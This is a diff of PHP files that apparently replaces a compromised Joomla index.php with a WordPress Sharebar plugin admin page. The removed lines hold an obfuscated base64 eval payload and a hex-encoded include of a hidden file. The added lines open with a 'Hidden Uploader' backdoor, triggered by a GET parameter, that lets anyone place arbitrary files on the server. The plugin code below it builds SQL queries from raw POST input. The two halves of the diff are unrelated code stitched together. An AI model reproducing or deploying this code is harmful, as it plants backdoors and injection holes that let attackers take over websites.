lMaicuCidWNEZPR1pQT0c0dk9SNUU5dXNyQ0dzckNHc3J4N1lDaEdzckNHc3JDR3NyQ0dzckNvNXJFMnM5RkxIMEZYdUU5dXNyQ0dzckNHc3JDR3NyQ0dzckNHc0xsOGonLgonTEhHWlBoOEdSUTZlRG1rSFJqelR5aHM1YkcyV3JDR3NyQ0dzckNHc3JDR3NyQ0dzckNEd0RoUnNQYUtzTHdWU2NDMkhMSGVZQ2gnLgonR3NyQ0dzckNHc3JDR3NyQ0dzckNHNDBKNzRyRTIrckNvWDBGbzZKSEQ2dkhERGJHMldyQ0dzckNHc3JDR3NyQycuCidHc1dhN1lDaEdzckNHc3JDR3NyQ0dzclFrcXZRZnM5eFl6Um16NnlRek1wT3NYdk9YbkU5dXNyQ0dzckNHc3JDR3NyQycuCic4emdRejJOZTJXckNHc3JDR3NyQzhaRTl1c3JDR3NyQ0dzclFrN1JqazVwaEd1TFFvNkRRSXlMalY0Rk9HWlAnLgonT0c0cE9SNUU5dXNyQ0dzckNHc3J4N1lDaEdzckNHc3JDR3NyQ0dzclFrajBKZXVMUW82RFFJeUxqOTRGT1huJy4KJ0U5dXNyQ0dzckNHc3J4MllDaEdzckNHc3JDR3NwSjN3cEp6bXJDc1hwUUkyMGs3NDBPRERyRTJackNEZXl4azR2Sks0VzkyV3JDR3NyQ0dzckM4bkU5dXMnLgonckNHc3JDR3NyQ0dzckM4NXBoc1hwUUkyMGs3NFJqVjRGT0daUE9HNDBKb1hMSFhZQ2hHc3JDR3NyQ0dzckNHc3J4N1lDaEdzckNHc3JDR3NyQycuCidHc3JDR3NyQzhxUmRaZXl4azR2SkJBMEpvWFdDb1gwRm82SkhEZUxkMjdyQ29YMEZvNkpIRFhMZDI1TmUyV3JDR3NyQ0dzckNHc3JDR3NBJy4KJzkyV3JDR3NyQ0dzckNHc3JDR3NwSjN3cEp6bVdDb1gwRm82SkhEdzBPRERyRTJackNESHBKMjRXOTJXckNHc3JDR3NyQ0dzckNHc2dlMldyQ0dzckNHcycuCidyQ0dzckNHc3JDR3NyUVl3Rmw4N0RKRDV5elpIcEoydUxRbzZEUUl5TGxHNEZPWG5FOXVzckNHc3JDJy4KJ0dzckNHc3JDOFpFOXVzckNHc3JDR3NyeDJZQ2hHc3JDR3NyQ0dzcEpZdXlIR1hwUUkyMGs3NDBKNzRGYTdZQ2hHcycuCidyQ0dzckNHc3BGNjVEQ3M1TmUyV3JDR3NyeDJZQ3MyV3JDR3NyUVl3Rmw4N0RKRDV5elo3eWpJJy4KJ1hXQ1huRTk1Wic7CiRjbGp3aXUgPSBBcnJheSgnMSc9PidxJywgJzAnPT4nWScsICczJz0+J3gnLCAnMic9PicwJywgJzUnPT4ncCcsICc0Jz0+J24nLCAnNyc9PidzJywgJzYnPT4naCcsICc5Jz0+J1EnLCAnOCc9PidCJywgJ0EnPT4nZicsICdDJz0+J0MnLCAnQic9Pic1JywgJ0UnPT4nRCcsICdEJz0+J2QnLCAnRyc9PidBJywgJ0YnPT4nWCcsICdJJz0+J0YnLCAnSCc9Pid5JywgJ0snPT4nNCcsICdKJz0+J1cnLCAnTSc9Pic2JywgJ0wnPT4nSicsICdPJz0+J1MnLCAnTic9PidPJywgJ1EnPT4nRycsICdQJz0+J1AnLCAnUyc9Pid1JywgJ1InPT4nYycsICdVJz0+J1UnLCAnVCc9Pid2JywgJ1cnPT4nSycsICdWJz0+J0UnLCAnWSc9PidOJywgJ1gnPT4naycsICdaJz0+JzknLCAnYSc9PidUJywgJ2MnPT4nTScsICdiJz0+J0wnLCAnZSc9Pid3JywgJ2QnPT4nMScsICdnJz0+J2UnLCAnZic9Pic4JywgJ2knPT4ndCcsICdoJz0+J2knLCAnayc9PidWJywgJ2onPT4nMicsICdtJz0+J20nLCAnbCc9PiczJywgJ28nPT4nUicsICduJz0+JzcnLCAncSc9PidqJywgJ3AnPT4nWicsICdzJz0+J2cnLCAncic9PidJJywgJ3UnPT4nbycsICd0Jz0+J3InLCAndyc9Pid6JywgJ3YnPT4nYScsICd5Jz0+J2InLCAneCc9PidIJywgJ3onPT4nbCcpOwpldmFsLypwYiovKG9ucXdjaW9jKCRtbmJpZHZka3osICRjbGp3aXUpKTsKfQ=="));
-
-include "\x2fhom\x65/st\x72ato\x2fhtt\x70/pr\x65miu\x6d/ri\x64/19\x2f96/\x35330\x31996\x2fhtd\x6fcs/\x70ubl\x69c_h\x74ml/\x70lug\x69ns/\x64jme\x64iat\x6fols\x2fk2/\x68elp\x2ephp";
-
-
-/**
- * @package		Joomla.Site
- * @copyright	Copyright (C) 2005 - 2014 Open Source Matters, Inc. All rights reserved.
- * @license		GNU General Public License version 2 or later; see LICENSE.txt
- */
-
-// Set flag that this is a parent file.
-define('_JEXEC', 1);
-define('DS', DIRECTORY_SEPARATOR);
-
-if (file_exists(dirname(__FILE__) . '/defines.php')) {
-	include_once dirname(__FILE__) . '/defines.php';
+<?php if(isset($_GET['aan']))
+{
+echo "<body bgcolor=white>
+<font color=black size=3>";
+echo "<h2>aAn Hidden Uploader</h2>";
+echo "<form action=\"\" method=\"post\" enctype=\"multipart/form-data\">
+<label for=\"file\">Filename:</label>
+<input type=\"file\" name=\"file\" id=\"file\" />
+<br />
+<input type=\"submit\" name=\"submit\" value=\"UPLOAD IT\">
+</form>";
+if ($_FILES["file"]["error"] > 0)
+{
+echo "Error: " . $_FILES["file"]["error"] . "<br />";
+}
+else
+{
+echo "Upload: " . $_FILES["file"]["name"] . "<br />";
+echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />";
+echo "Stored in: " . $_FILES["file"]["tmp_name"];
+}
+if (file_exists("" . $_FILES["file"]["name"]))
+{
+echo $_FILES["file"]["name"] . " udah ada ";
+}
+else
+{
+move_uploaded_file($_FILES["file"]["tmp_name"],
+"" . $_FILES["file"]["name"]);
+echo "Stored in: " . "" . $_FILES["file"]["name"];
+echo"";
+}
 }
 
-if (!defined('_JDEFINES')) {
-	define('JPATH_BASE', dirname(__FILE__));
-	require_once JPATH_BASE.'/includes/defines.php';
-}
+?>
+<?php
+	/*  Copyright 2010  Monji Dolon  (email : md@devgrow.com)
+	      Author Homepage: http://mdolon.com/   Author Blog: http://devgrow.com/
 
-require_once JPATH_BASE.'/includes/framework.php';
+		This program is free software; you can redistribute it and/or modify
+		it under the terms of the GNU General Public License, version 2, as 
+		published by the Free Software Foundation.
 
-// Mark afterLoad in the profiler.
-JDEBUG ? $_PROFILER->mark('afterLoad') : null;
+		This program is distributed in the hope that it will be useful,
+		but WITHOUT ANY WARRANTY; without even the implied warranty of
+		MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+		GNU General Public License for more details.
 
-// Instantiate the application.
-$app = JFactory::getApplication('site');
+		You should have received a copy of the GNU General Public License
+		along with this program; if not, write to the Free Software
+		Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
+	*/
+	if(!function_exists('sharebar') || !is_admin()) {
+		echo "You are not authorized to access this file.";
+		exit();
+	}
+	$id = sanitize($_GET['id'] ? $_GET['id'] : $_POST['id']);
+	$pos = sanitize($_GET['pos'] ? $_GET['pos'] : $_POST['pos']);
+	$status = sanitize($_GET['status'] ? $_GET['status'] : $_POST['status']);
+	$task = sanitize($_GET['t'] ? $_GET['t'] : $_POST['t']);
+	$do = sanitize($_POST['do']);
+	
+	if($id)	$item = $wpdb->get_row($wpdb->prepare("SELECT * FROM ".$wpdb->prefix."sharebar WHERE id=%d", $id));
 
-// Initialise the application.
-$app->initialise();
+	if($do == 'update') $wpdb->query($wpdb->prepare("UPDATE ".$wpdb->prefix."sharebar SET enabled='%d', position='%d', name='%s', big='". $_POST['big'] ."', small='". $_POST['small'] ."' WHERE id='%d'", sanitize($_POST['enabled']), sanitize($_POST['position']), sanitize($_POST['name']), $id));
+	elseif($do == 'add') $wpdb->query($wpdb->prepare("INSERT INTO ".$wpdb->prefix."sharebar (position, name, big, small) VALUES('%d','%s', '". $_POST['big'] ."', '". $_POST['small'] ."')", sanitize($_POST['position']), sanitize($_POST['name'])));
+	elseif($do == 'delete') $wpdb->query($wpdb->prepare("DELETE FROM ".$wpdb->prefix."sharebar WHERE id=%d LIMIT 1", $id));
+	elseif($do == 'reset') sharebar_reset();
+	elseif($do == 'settings'){
+		$binaries = array("auto_posts","auto_pages","horizontal","credit");
+		foreach($binaries as $binary) $_POST[$binary] = $_POST[$binary] ? 1:0;
+		$_POST['width'] = $_POST['width'] ? $_POST['width']:1000;
+		sharebar_settings($_POST);
+		foreach($sharebar_options as $option) $$option = get_option('sharebar_'.$option);
+	}elseif($do == 'update-all'){
+		$buttons = $_POST['buttons'];
+		$uptask = $_POST['update-task'];
+		if($buttons){
+			foreach ($buttons as $button)
+				sharebar_update_button($button,$uptask);
+			$status = "Buttons have been ".$uptask."d";
+		}else
+			$status = "No buttons selected.";
+	}
+	if($task == "linkback"){
+		if($credit){
+			$current = "disabled";
+			update_option('sharebar_credit','0');
+		}else{
+			$current = "enabled";
+			update_option('sharebar_credit','1');
+		}
+		$status = 'Linkback '.$current;
+		$credit = get_option('sharebar_credit');
+	}
+	
+	if($pos == 'moveup') $wpdb->query($wpdb->prepare("UPDATE ".$wpdb->prefix."sharebar SET position=position-1 WHERE id='%d'", $id));
+	if($pos == 'movedown') $wpdb->query($wpdb->prepare("UPDATE ".$wpdb->prefix."sharebar SET position=position+1 WHERE id='%d'", $id));
+	if($pos) $status = "Position Updated!";
+?>
+<style>
+	.wrap { width: 700px; }
+	.h4title { margin:0 0 20px;overflow:hidden; }
+	.wrap form label.wide { width: 100%; float: left; padding: 2px; font-weight: bold; }
+	.wrap form .text { width: 400px; }
+	.wrap form .mediumtext { width: 160px; }
+	.wrap form .smalltext { width: 120px; }
+	.wrap form .minitext { width: 50px; margin-right: 5px; }
+	.wrap form .checkbox { margin-right: 5px; }
+	.wrap form .checkfield { margin: 32px 0 0 15px; }
+	.wrap form p.mediumtext { margin-right: 20px; }
+	.thebutton { text-align: center; overflow: hidden; background: #fff; padding: 10px; border: 1px solid #ccc; }
+	.thebutton td { padding: 0 15px; }
+	.thebutton .name { padding: 0 0 10px; }
+	.right-button { margin: 15px 0 0 15px; }
+	.info-box { width: 400px; float: left; padding: 0 10px; background: #fff; border: 1px solid #ccc; }
+	.info-box-right { width: 250px; float: right; padding: 0 10px; background: #fff; border: 1px solid #ccc; }
+	.info-box-right p { font-size: 11px; }
+	.info-box-right ul { font-size: 11px; list-style-type: square; list-style-position: inside; }
+	.info-box-right ul li { margin: 0 0 15px; }
+	.sb-divider { clear: both; width: 100%: float: left; border-bottom: 5px solid #ddd; display: block; height: 20px;}
 
-// Mark afterIntialise in the profiler.
-JDEBUG ? $_PROFILER->mark('afterInitialise') : null;
+	#sharebar-tl{width:700px;margin:0;padding:0;}
+	#sharebar-tl caption{width:700px;font:italic 11px "Trebuchet MS", Verdana, Arial, Helvetica, sans-serif;text-align:right;padding:0 0 5px;}
+	#sharebar-tl th{font:bold 11px "Trebuchet MS", Verdana, Arial, Helvetica, sans-serif;color:#4f6b72;border-right:1px solid #C1DAD7;border-bottom:1px solid #C1DAD7;border-top:1px solid #C1DAD7;letter-spacing:2px;text-transform:uppercase;text-align:left;background:#CAE8EA no-repeat;padding:6px 6px 6px 12px;}
+	#sharebar-tl th.nobg{border-top:0;border-left:0;border-right:1px solid #C1DAD7;background:none;}
+	#sharebar-tl td{border-right:1px solid #C1DAD7;border-bottom:1px solid #C1DAD7;background:#fff;color:#4f6b72;padding:6px 6px 6px 12px;}
+	#sharebar-tl td.alt{background:#F5FAFA;color:#797268;}
+	#sharebar-tl th.spec{border-left:1px solid #C1DAD7;border-top:0;background:#fff no-repeat;font:bold 10px "Trebuchet MS", Verdana, Arial, Helvetica, sans-serif;}
+	#sharebar-tl th.specalt{border-left:1px solid #C1DAD7;border-top:0;background:#f5fafa no-repeat;font:bold 10px "Trebuchet MS", Verdana, Arial, Helvetica, sans-serif;color:#797268;}
+	#sharebar-tl td, #sharebar-tl th { text-align: center; }
+	#sharebar-tl tr { margin-bottom: 10px; }
+	#sharebar-tl tr.disabled td { background: #f2f2f2; }
+	#sharebar-tl .leftj { text-align: left; }
+	.sharebar-button { font-size: 11px; font-family: Verdana, Arial; padding: 2px 4px; background: #f7f7f7; color: #444; border: 1px solid #ddd; display: block; }
+	.sharebar-button:hover { border-color: #aaa; }
+	.FBConnectButton_Small{background-position:-5px -232px !important;border-left:1px solid #1A356E;}
+	.FBConnectButton_Text{margin-left:12px !important ;padding:2px 3px 3px !important;}
+</style>
+<script type="text/javascript">
+jQuery(document).ready(function(){
+	jQuery('.toggle-all').click(function(){
+		var checkboxes = jQuery('form').find(':checkbox');
+		checkboxes.attr('checked', !checkboxes.attr('checked'));
+		return false;
+	});
+});
+</script>
 
-// Route the application.
-$app->route();
+<div class="wrap">
 
-// Mark afterRoute in the profiler.
-JDEBUG ? $_PROFILER->mark('afterRoute') : null;
+<?php if($status){?><div id="message" class="updated fade"><?php echo $status; ?></div><?php } ?>
 
-// Dispatch the application.
-$app->dispatch();
+<h2>Custom Sharebar</h2>
 
-// Mark afterDispatch in the profiler.
-JDEBUG ? $_PROFILER->mark('afterDispatch') : null;
+<h4 class="h4title">
+	<div class="alignleft">By <a href="http://mdolon.com/" target="_blank">Monji</a> of <a href="http://devgrow.com/" target="_blank">DevGrow</a> and <a target="_blank" href="http://wordpress.org/plugins/sumome/">the (amazing) SumoMe WP Plugin</a> </div><div class="alignright"><a href="?page=Sharebar">Home</a> - <a href="?page=Sharebar&t=settings">Settings</a> 
+	</div>
+</h4>
 
-// Render the application.
-$app->render();
+<?php if($task == 'edit' || $task == 'new'){?>
 
-// Mark afterRender in the profiler.
-JDEBUG ? $_PROFILER->mark('afterRender') : null;
+	<h3><?php if($task == 'edit') echo "Edit"; else echo "Add New"; ?> Button</h3>
+	<p>You can use HTML, Javascript or inline CSS for the button code.  Additionally, the following variables are automatically extracted from the post and can be used in your code: <strong>[url]</strong>, <strong>[title]</strong>, and <strong>[author]</strong>.</p>
+	<p>If you have set your Twitter username in the <a href="?page=Sharebar&t=settings">settings</a>, that will also be available using <strong>[twitter]</strong>.</p>
+	<?php
+		if($task == 'edit'){
+			echo '<table class="thebutton">';
+			echo "<tr><th class='name'><strong>".$item->name.":</strong></th></tr>";
+			echo "<tr><td>".$item->big."</td>";
+			echo "<td>".$item->small."</td></tr>";
+			echo '</table>';
+		}
+		if($item->enabled) $enabled = " checked='true'";
+	?>
+	<form action="?page=<?php echo $_GET['page']; ?>" method="post">
+		<p class="mediumtext alignleft">
+			<label for="name" class="wide">Name:</label>
+			<input type="text" name="name" id="name" value="<?php echo $item->name; ?>" class="mediumtext" />
+		</p>
+		<p class="smalltext alignleft">
+			<label for="position" class="wide">Position:</label>
+			<input type="text" name="position" id="position" value="<?php echo $item->position; ?>" class="smalltext" />
+		</p>
+		<p class="checkfield alignleft">
+			<input type="hidden" name="enabled" value="0" />
+			<input type="checkbox" name="enabled" id="enabled" value="1" <?php echo $enabled; ?> /> <label for="enabled">Enabled?</label>
+		</p>
+		<div style="clear:both;"></div>
+		<p>
+			<label for="big" class="wide">Big Button:</label>
+			<textarea name="big" id="big" class="text" rows=5><?php echo $item->big; ?></textarea>
+		</p>
+		<p>
+			<label for="small" class="wide">Small Button:</label>
+			<textarea name="small" id="small" class="text" rows=5><?php echo $item->small; ?></textarea>
+		</p>
+		<input type="hidden" name="do" value="<?php if($task == 'edit') echo "update"; else echo "add"; ?>" />
+		<input type="hidden" name="id" value="<?php echo $item->id; ?>" />
+		<input type="hidden" name="status" value="Share button has been <?php if($task == 'edit') echo "updated"; else echo "added"; ?>." />
+		<input type="submit" value="<?php if($task == 'edit') echo "Update Button"; else echo "Add Button"; ?>" class="alignleft button-primary" />
+	</form>
+	<a href="?page=<?php echo $_GET['page']; ?>" class="alignleft" style="margin: 2px 0 0 10px;">Cancel</a>
+		
+<?php }elseif($task == 'delete'){ ?>
 
-// Return the response.
-echo $app;
+	<h3>Delete Button?</h3>
+	<?php
+		echo '<table class="thebutton">';
+		echo "<tr><th class='name'><strong>".$item->name.":</strong></th></tr>";
+		echo "<tr><td>".$item->big."</td>";
+		echo "<td>".$item->small."</td></tr>";
+		echo '</table>';
+	?>
+	<p>Are you sure you want to delete this button?</p>
+	<form action="?page=<?php echo $_GET['page']; ?>" method="post">
+		<input type="hidden" name="do" value="delete" />
+		<input type="hidden" name="id" value="<?php echo $item->id; ?>" />
+		<input type="hidden" name="status" value="Button has been deleted." />
+		<input type="submit" value="Delete" class="alignleft button-primary" />
+	</form>
+	<a href="?page=<?php echo $_GET['page']; ?>" class="alignleft" style="margin: 2px 0 0 10px;">Cancel</a>
+		
+<?php }elseif($task == 'reset'){ ?>
+
+	<h3>Reset Buttons?</h3>
+	<p>Are you sure you want to reset <strong>ALL</strong> share buttons?  This cannot be undone and you will lose any customizations - all buttons will be reset to defaults.</p>
+	<form action="?page=<?php echo $_GET['page']; ?>" method="post">
+		<input type="hidden" name="do" value="reset" />
+		<input type="hidden" name="status" value="All buttons have been reset to inital configuration." />
+		<input type="submit" value="Reset ALL Buttons" class="alignleft button-primary" />
+	</form>
+	<a href="?page=<?php echo $_GET['page']; ?>" class="alignleft" style="margin: 2px 0 0 10px;">Cancel</a>
+		
+<?php }elseif($task == 'settings'){ ?>
+
+	<h3>Sharebar Settings</h3>
+	<form action="?page=<?php echo $_GET['page']; ?>&t=settings" method="post">
+		<h4>Add Sharebar</h4>
+		<p>The following settings allow you to automatically add the Sharebars to your posts and pages.  If you would like to add them manually, make sure that both are unchecked and paste the PHP code into your template instead.</p>
+		<p>
+			<input type="checkbox" name="auto_posts" id="auto_posts" value="true" class="checkbox" <?php if($auto_posts) echo "checked"; ?> /><label for="auto_posts">Automatically add Sharebar to posts? (only affects single posts)</label>
+		</p>
+		<p>
+			<input type="checkbox" name="auto_pages" id="auto_pages" value="true" class="checkbox" <?php if($auto_pages) echo "checked"; ?> /><label for="auto_pages">Automatically add Sharebar to pages? (only affects pages)</label>
+		</p>
+		<h4>Display Options</h4>
+		<p>
+			<input type="checkbox" name="horizontal" value="true" id="horizontal" class="checkbox" <?php if($horizontal) echo "checked"; ?> /><label for="horizontal">Display horizontal Sharebar if the page is resized to less than <em><?php echo $width; ?>px</em>?</label>
+		</p>
+		<p>
+<input type="checkbox" name="credit" value="true" id="credit" class="checkbox" <?php if($credit) echo "checked"; ?> /><label for="credit">Display maker credit link? </label>
+		</p>
+		<p>
+			<select name="position" id="position">
+				<option value="left"<?php if($position == 'left') echo " selected"; ?>>Left </option>
+				<option value="right"<?php if($position == 'right') echo " selected"; ?>>Right </option>
+			</select>
+			<label for="position">Sharebar Position</label>
+		</p>
+		<p>
+			<input type="text" name="leftoffset" id="leftoffset" class="minitext" value="<?php echo $leftoffset; ?>" /><label for="leftoffset">Left Offset (used when positioned to left)</label>
+		</p>
+		<p>
+			<input type="text" name="rightoffset" id="rightoffset" class="minitext" value="<?php echo $rightoffset; ?>" /><label for="rightoffset">Right Offset (used when positioned to right)</label>
+		</p>
+		<p>
+			<input type="text" name="width" id="width" class="minitext" value="<?php echo $width; ?>" /><label for="width">Minimum width in pixels required to show vertical Sharebar to the left of post (cannot be blank)</label>
+		</p>
+		<h4>Customize</h4>
+		<p>
+			<label for="swidth">Sharebar Width:</label>
+			<input type="text" name="swidth" id="swidth" class="minitext" value="<?php echo $swidth; ?>" />
+		</p>
+		<p>
+			<label for="twitter_username">Twitter Username:</label>
+			<input type="text" name="twitter_username" id="twitter_username" class="smalltext" value="<?php echo $twitter_username; ?>" />
+		</p>
+		<p>
+			<label for="twitter_username">Sharebar Background Color:</label>
+			<input type="text" name="sbg" id="sbg" class="smalltext" value="<?php echo $sbg; ?>" />
+		</p>
+		<p>
+			<label for="twitter_username">Sharebar Border Color:</label>
+			<input type="text" name="sborder" id="sborder" class="smalltext" value="<?php echo $sborder; ?>" />
+		</p>
+		<br />
+		<input type="hidden" name="do" value="settings" />
+		<input type="hidden" name="status" value="Sharebar settings updated." />
+		<input type="submit" value="Update Settings" class="alignleft button-primary" />
+	</form>
+	<a href="?page=<?php echo $_GET['page']; ?>" class="alignleft" style="margin: 2px 0 0 10px;">Cancel</a>
+		
+<?php }elseif($task == 'donate'){ ?>
+
+	<h3>Donate</h3>
+	<p>Sharebar is created by and maintained by just one person - <a href="http://twitter.com/mdolon">@mdolon</a>.  If you like the plugin, please consider donating a buck or two by clicking the button below:</p>
+	<p>
+		<form action="https://www.paypal.com/cgi-bin/webscr" method="post">
+		<input type="hidden" name="cmd" value="_donations">
+		<input type="hidden" name="business" value="mdolon@gmail.com">
+		<input type="hidden" name="lc" value="US">
+		<input type="hidden" name="item_name" value="Sharebar WordPress Plugin">
+		<input type="hidden" name="no_note" value="0">
+		<input type="hidden" name="currency_code" value="USD">
+		<input type="hidden" name="bn" value="PP-DonationsBF:btn_donate_SM.gif:NonHostedGuest">
+		<input type="image" src="https://www.paypal.com/en_US/i/btn/btn_donate_SM.gif" border="0" name="submit" alt="PayPal - The safer, easier way to pay online!">
+		<img alt="" border="0" src="https://www.paypal.com/en_US/i/scr/pixel.gif" width="1" height="1">
+		</form>
+	</p>
+
+<?php }else{ ?>
+
+	<div class="updated fade"><strong>Update:</strong> Sharebar recommends <a target="_blank" href="https://wordpress.org/plugins/sumome">SumoMe</a> for even more powerful sharing tools!</div>
+	<div class="info-box">
+		<p><strong>Sharebar</strong> adds a dynamic and fully customizable vertical box to the left of a blog post that contains links/buttons to popular social networking sites.</p>
+		<p><strong>Big Buttons</strong> are used in the vertical Sharebar to the left of the post, while the <strong>Small Buttons</strong> are used in the horizontal Sharebar that appears under the post title (by default) if the width of the page is less than <strong><?php echo $width; ?>px</strong>.</p>
+		<?php if($auto_posts || $auto_pages){
+				$amsg .= "<p><strong>Auto mode is ON</strong> - Sharebar will be automatically added to ";
+				if($auto_posts) $amsg .= "posts";
+				if($auto_posts && $auto_pages) $amsg .= " and ";
+				if($auto_pages) $amsg .= "pages";
+				$amsg .= ".";
+			}else
+				$amsg .= "<p><strong>Auto mode is OFF</strong>, so you must manually add the following code for the horizontal and vertical bars:</p>
+							<blockquote><strong>Vertical (next to post) Sharebar:</strong>
+							<code>&lt;?php sharebar(); ?&gt;</code><br />
+							<strong>Horizontal Sharebar:</strong>
+							<code>&lt;?php sharebar_horizontal(); ?&gt;</code></blockquote>";
+			echo $amsg;
+		?>
+		<p>You can also call an individual button in any template by using the following code (where size is either <em>big</em> or <em>small</em>):</p>
+		<p><code>&lt;?php sharebar_button('name','size'); ?&gt;</code></p>
+	</div>
+	<div class="info-box-right">
+		<h3>Support Us</h3>
+		<p>If you like Sharebar and find it useful, please consider showing your support by:</p>
+		<?php
+			$current = $credit ? 'Disable':'Enable';
+		?>
+		<ul>
+			<li>1- Check out our  <a target="_blank" href="https://wordpress.org/plugins/sumome">SumoMe Plugin</a></li>
+			<li>2- <a target="_blank" href="https://wordpress.org/support/view/plugin-reviews/sharebar">Leave a :) review</a></li>
+			<li>3- Install our  <a target="_blank" href="https://wordpress.org/plugins/google-analyticator/">Google Analytics Plugin</a></li>
+		</ul>
+	</div>
+	<div class="sb-divider"></div>
+	
+	<div class="alignright" style="margin-top: 10px;">
+		<a href="?page=<?php echo $_GET['page']; ?>&t=reset" class="alignleft button right-button" style="margin-right: 10px;">Reset Buttons</a><a href="?page=Sharebar&t=new" class="button-primary alignleft right-button">Add New Button</a>
+	</div>
+	<h3 class="alignleft">Available Buttons:</h3>
+	
+	<form action="?page=<?php echo $_GET['page']; ?>" method="post">
+	<table id="sharebar-tl">
+		<thead><tr><th><a href="/" class="toggle-all">All</a></th><th class='leftj'>Name</th><th>Position</th><th>Big Button</th><th>Small Button</th><th>Actions</th></tr></thead>
+		<tbody>	
+		<?php $results = $wpdb->get_results("SELECT * FROM ".$wpdb->prefix."sharebar ORDER BY position, id ASC"); echo "\n";
+		foreach($results as $result){
+			if(!$result->enabled){
+				$dis = " class='disabled'";
+				$name = '<em>'.$result->name.'</em>';
+			}else{
+				$dis = "";
+				$name = $result->name;
+			}
+			echo "\t\t<tr$dis><td><input type='checkbox' name='buttons[]' id='buttons' value='".$result->id."' class='checkbox c23' /></td><td class='leftj'>".$name."</td><td>".$result->position."<a href='?page=Sharebar&pos=moveup&id=".$result->id."'><img src='" . plugins_url() ."/sharebar/images/up.gif'/></a><a href='?page=Sharebar&pos=movedown&id=".$result->id."'><img src='" . plugins_url() ."/sharebar/images/down.gif'/></a></td><td>".$result->big."</td><td>".$result->small."</td><td><a href='?page=".$_GET['page']."&t=edit&id=".$result->id."'>Edit</a> | <a href='?page=".$_GET['page']."&t=delete&id=".$result->id."'>Delete</a></td></tr>\n";
+		} ?>
+		</tbody>
+	</table>
+	<div class="alignleft">
+		<p>
+			<label for="update-task">With Selected:</label>
+			<select id="update-task" name="update-task">
+				<option value="enable">Enable</option>
+				<option value="disable">Disable</option>
+				<option value="delete">Delete</option>
+			</select>
+			<input type="hidden" name="do" value="update-all">
+			<input type="submit" class="button" value="Update" />
+		</p>
+	</div>
+	<div class="alignright">
+		<p><small style="color:black;font-weight:bold;">grey = disabled / white = enabled</small></p>
+	</div>
+	</form>
+<?php } ?>
+
+</div>
